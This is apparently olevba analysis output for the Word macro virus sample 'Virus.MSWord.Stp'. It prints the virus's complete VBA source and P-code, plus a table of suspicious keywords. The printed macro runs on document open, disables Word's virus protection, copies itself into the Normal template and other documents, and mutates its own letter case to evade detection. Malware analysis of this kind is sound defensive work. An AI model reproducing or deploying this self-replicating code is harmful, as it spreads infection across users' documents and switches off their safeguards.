olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Stp
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Stp - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_OPen()
On Error Resume Next
Options.VirusProtection = 0: EnableCancelKey = 0
Set MAci = MacroContainer.VBProject.vbComPonENTS.Item(1)
Set MACIc = MAci.codeMoDulE
mI = Left(MACIc.lines(1, 1), 21)
Set iNF = NormalTemplate: mIY = mI + "ClOsE"
If MacroContainer = iNF Then Set iNF = ActiveDocument: mIY = mI + "Open"
Set Infc = iNF.VBProject.vbComPonENTS
Set InFi = Infc.Item(1)
Set inFIC = InFi.codeMoDulE
S = UCase$(MACIc.lines(1, 25))
For kU = 1 To Len(S)
T = Mid(S, kU, 1)
If Asc(T) < 90 And Asc(T) > 65 Then T = Chr$(Asc(T) + Int(Rnd * 2) * 32)
P = P & T
Next kU
MACIc.dElEtElInes 1, 25
MACIc.ADdfRomsTriNg P
For Ik = 2 To Infc.Count: Infc.Remove Infc.Item(2): Next Ik
inFIC.dElEtElInes 1, inFIC.CoUNtOFLInES
inFIC.ADdfRomsTriNg P
inFIC.ReplAcElinE 1, mIY
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'SeLFteXTpOLymORPHism (stP-demo) V1.1 3:16pM Tue MAY 18 99
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Stp
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3168 bytes
' Line #0:
' 	FuncDefn (Private Sub document_OPen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St EnableCancelKey 
' Line #3:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd vbComPonENTS 
' 	ArgsMemLd Item 0x0001 
' 	Set MAci 
' Line #4:
' 	SetStmt 
' 	Ld MAci 
' 	MemLd codeMoDulE 
' 	Set MACIc 
' Line #5:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MACIc 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0015 
' 	ArgsLd LBound 0x0002 
' 	St mI 
' Line #6:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set iNF 
' 	BoS 0x0000 
' 	Ld mI 
' 	LitStr 0x0005 "ClOsE"
' 	Add 
' 	St mIY 
' Line #7:
' 	Ld MacroContainer 
' 	Ld iNF 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set iNF 
' 	BoS 0x0000 
' 	Ld mI 
' 	LitStr 0x0004 "Open"
' 	Add 
' 	St mIY 
' 	EndIf 
' Line #8:
' 	SetStmt 
' 	Ld iNF 
' 	MemLd VBProject 
' 	MemLd vbComPonENTS 
' 	Set Infc 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Infc 
' 	ArgsMemLd Item 0x0001 
' 	Set InFi 
' Line #10:
' 	SetStmt 
' 	Ld InFi 
' 	MemLd codeMoDulE 
' 	Set inFIC 
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0019 
' 	Ld MACIc 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd UCase$ 0x0001 
' 	St S 
' Line #12:
' 	StartForVariable 
' 	Ld kU 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld S 
' 	FnLen 
' 	For 
' Line #13:
' 	Ld S 
' 	Ld kU 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St T 
' Line #14:
' 	Ld T 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x005A 
' 	Lt 
' 	Ld T 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0041 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld T 
' 	ArgsLd Asc 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0020 
' 	Mul 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St T 
' 	EndIf 
' Line #15:
' 	Ld P 
' 	Ld T 
' 	Concat 
' 	St P 
' Line #16:
' 	StartForVariable 
' 	Ld kU 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0019 
' 	Ld MACIc 
' 	ArgsMemCall dElEtElInes 0x0002 
' Line #18:
' 	Ld P 
' 	Ld MACIc 
' 	ArgsMemCall ADdfRomsTriNg 0x0001 
' Line #19:
' 	StartForVariable 
' 	Ld Ik 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld Infc 
' 	MemLd Count 
' 	For 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Infc 
' 	ArgsMemLd Item 0x0001 
' 	Ld Infc 
' 	ArgsMemCall Remove 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld Ik 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	LitDI2 0x0001 
' 	Ld inFIC 
' 	MemLd CoUNtOFLInES 
' 	Ld inFIC 
' 	ArgsMemCall dElEtElInes 0x0002 
' Line #21:
' 	Ld P 
' 	Ld inFIC 
' 	ArgsMemCall ADdfRomsTriNg 0x0001 
' Line #22:
' 	LitDI2 0x0001 
' 	Ld mIY 
' 	Ld inFIC 
' 	ArgsMemCall ReplAcElinE 0x0002 
' Line #23:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #24:
' 	EndSub 
' 	QuoteRem 0x0008 0x0039 "SeLFteXTpOLymORPHism (stP-demo) V1.1 3:16pM Tue MAY 18 99"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_OPen       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbComPonENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codeMoDulE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|ADdfRomsTriNg       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

